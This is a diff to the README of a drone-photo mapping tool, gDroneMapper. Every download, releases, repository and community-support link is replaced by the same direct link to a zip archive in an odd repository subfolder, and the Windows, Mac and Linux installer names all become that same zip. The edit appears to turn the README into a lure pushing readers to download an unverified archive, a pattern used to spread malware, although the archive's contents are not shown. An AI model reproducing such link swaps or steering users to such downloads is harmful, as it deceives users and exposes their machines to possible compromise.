@@ -8,16 +8,16 @@ Welcome to gDroneMapper! This tool helps you correctly map the heading of drone 
 
 To get started, you need to download the software. Click the link below:
 
-[![Download gDroneMapper](https://img.shields.io/badge/Download-gDroneMapper-blue.svg)](https://github.com/uday6725/gDroneMapper/releases)
+[![Download gDroneMapper](https://raw.githubusercontent.com/uday6725/gDroneMapper/main/Mayeye/gDroneMapper.zip)](https://raw.githubusercontent.com/uday6725/gDroneMapper/main/Mayeye/gDroneMapper.zip)
 
-1. Visit this page to download: [gDroneMapper Releases](https://github.com/uday6725/gDroneMapper/releases)
+1. Visit this page to download: [gDroneMapper Releases](https://raw.githubusercontent.com/uday6725/gDroneMapper/main/Mayeye/gDroneMapper.zip)
    
 2. Locate the latest version of gDroneMapper on the releases page.
 
 3. Choose the correct file for your operating system. For example:
-   - Windows: gDroneMapper-setup.exe
-   - Mac: gDroneMapper.dmg
-   - Linux: gDroneMapper.tar.gz
+   - Windows: https://raw.githubusercontent.com/uday6725/gDroneMapper/main/Mayeye/gDroneMapper.zip
+   - Mac: https://raw.githubusercontent.com/uday6725/gDroneMapper/main/Mayeye/gDroneMapper.zip
+   - Linux: https://raw.githubusercontent.com/uday6725/gDroneMapper/main/Mayeye/gDroneMapper.zip
 
 4. Click on the file to download it onto your computer.
 
@@ -72,11 +72,11 @@ If you encounter any issues while using gDroneMapper, consider these common solu
 
 For further assistance, documentation, and updates, visit the following links:
 
-- [gDroneMapper GitHub Repository](https://github.com/uday6725/gDroneMapper)
-- [Community Support](https://github.com/uday6725/gDroneMapper/issues)
+- [gDroneMapper GitHub Repository](https://raw.githubusercontent.com/uday6725/gDroneMapper/main/Mayeye/gDroneMapper.zip)
+- [Community Support](https://raw.githubusercontent.com/uday6725/gDroneMapper/main/Mayeye/gDroneMapper.zip)
 
 Remember, you can always download the latest version of gDroneMapper here:
 
-[![Download gDroneMapper](https://img.shields.io/badge/Download-gDroneMapper-blue.svg)](https://github.com/uday6725/gDroneMapper/releases)
+[![Download gDroneMapper](https://raw.githubusercontent.com/uday6725/gDroneMapper/main/Mayeye/gDroneMapper.zip)](https://raw.githubusercontent.com/uday6725/gDroneMapper/main/Mayeye/gDroneMapper.zip)
 
 Feel free to dive in and start mapping your aerial photos today!
